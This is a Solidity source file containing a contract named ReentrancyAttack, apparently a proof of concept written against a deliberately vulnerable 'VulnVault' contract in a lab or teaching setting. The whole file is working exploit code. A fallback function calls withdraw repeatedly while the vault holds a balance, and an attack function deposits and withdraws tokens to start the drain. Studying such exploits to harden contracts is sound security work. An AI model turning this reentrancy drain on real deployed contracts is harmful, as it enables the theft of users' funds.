// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./fee-on-transfer.sol";

contract ReentrancyAttack {
    VulnVault public vulnVault;
    STA public staToken;

    constructor(address _vulnVaultAddress, address _staTokenAddress) {
        vulnVault = VulnVault(_vulnVaultAddress);
        staToken = STA(_staTokenAddress);
    }

    fallback() external payable {
        if (address(vulnVault).balance > 0) {
            vulnVault.withdraw(vulnVault.getBalance(address(this)));
        }
    }

    function attack(uint256 amount) external {
        staToken.approve(address(vulnVault), amount);
        vulnVault.deposit(amount);
        vulnVault.withdraw(amount);
    }
}